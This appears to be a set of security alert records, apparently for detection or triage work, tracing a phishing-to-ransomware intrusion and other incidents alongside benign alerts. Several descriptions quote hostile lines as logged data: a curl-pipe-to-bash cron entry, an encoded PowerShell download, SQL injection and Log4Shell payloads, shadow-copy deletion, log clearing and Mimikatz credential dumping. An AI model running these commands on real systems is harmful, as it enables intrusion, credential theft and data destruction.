title: Phishing email with macro-enabled attachment delivered and opened
description: Email from billing@invoice-update.example (relay 198.51.100.23) with attachment Invoice_2026.docm (sha256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08) and link http://invoice-update.example/inv_2026.zip was delivered to priya.sharma. The user opened the attachment.

title: Office application spawned PowerShell with encoded command
description: WINWORD.EXE spawned powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA (base64) which downloaded a second stage from http://cdn-sync.example/a.ps1.

title: Credential dumping: Mimikatz accessed LSASS memory
description: mimikatz.exe (md5 098f6bcd4621d373cade4e832627b4f6) opened a handle to lsass.exe with PROCESS_VM_READ and ran sekurlsa::logonpasswords.

title: C2 beaconing to known Cobalt Strike server
description: Periodic HTTPS beacon every 60s (jitter 10%) from finance-ws-07 (10.10.20.57) to cdn-sync.example resolving to 203.0.113.45.

title: RDP lateral movement from finance workstation to file server
description: Successful RDP logon (logon type 10) to fs-01 from 10.10.20.57 using account priya.sharma, which has never logged on to fs-01 before.

title: Large outbound transfer to C2 infrastructure (possible exfiltration)
description: Archive finance_q3.7z was created on fs-01 (7z a -p) and 2.3 GB was uploaded over HTTPS to 203.0.113.45 - a large outbound transfer far above the host baseline.

title: SSH brute force: 248 failed password attempts
description: sshd: 248 failed password attempts for root, admin and deploy from 198.51.100.77 within 10 minutes.

title: Successful SSH login after multiple failed attempts
description: sshd: Accepted password for deploy from 198.51.100.77 port 50122 - successful SSH login after multiple failed attempts from the same source.

title: New crontab entry downloading and executing a remote script
description: File integrity monitoring: /var/spool/cron/crontabs/deploy modified. New cron entry: */5 * * * * curl http://198.51.100.77/x.sh | bash

title: SQL injection attempt against /login
description: WAF matched SQL injection signature: username=admin' UNION SELECT username,password FROM users-- from 192.0.2.66.

title: Log4Shell JNDI exploit attempt in User-Agent
description: Request to :8080/api/search with User-Agent ${jndi:ldap://192.0.2.66:1389/Exploit} - Log4j JNDI lookup exploitation attempt.

title: Shadow copies deleted with vssadmin
description: cmd.exe /c vssadmin delete shadows /all /quiet executed by anil.kumar - inhibit system recovery.

title: Ransomware: mass file encryption detected
description: 4,812 files renamed to *.locked in 3 minutes by svch0st.exe (sha256 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824). Ransom note README_RESTORE.txt references pay-decrypt.example.

title: Security event log cleared
description: Event ID 1102: The audit log was cleared (wevtutil cl Security) by anil.kumar.

title: Sign-in from Tor exit node
description: Azure AD sign-in for arjun.mehta from Tor exit node 198.51.100.200 (MFA satisfied by push approval).

title: User added to Domain Admins group
description: Event ID 4728: svc_backup was added to the Domain Admins group by helpdesk01 on dc-01. No matching change record exists.

title: Direct DNS query to external resolver
description: mkt-ws-02 (10.10.40.12) sent DNS queries directly to 8.8.8.8, bypassing the corporate resolver.

title: Logon failure: bad password
description: Event ID 4625: 1 logon failure for rahul.verma on dc-01 (bad password), followed by a normal logon a minute later.

title: EICAR test file detected
description: Antivirus detected eicar.com (md5 44d88612fea8a8f36de82e1278abb02f) on it-ws-01 during the scheduled security awareness test run by the IT training team.

title: Internal vulnerability scan sweep
description: Nessus vulnerability scan from 10.10.5.5 across 10.10.0.0/16 (approved change ticket CHG-20431, weekly authenticated scan).
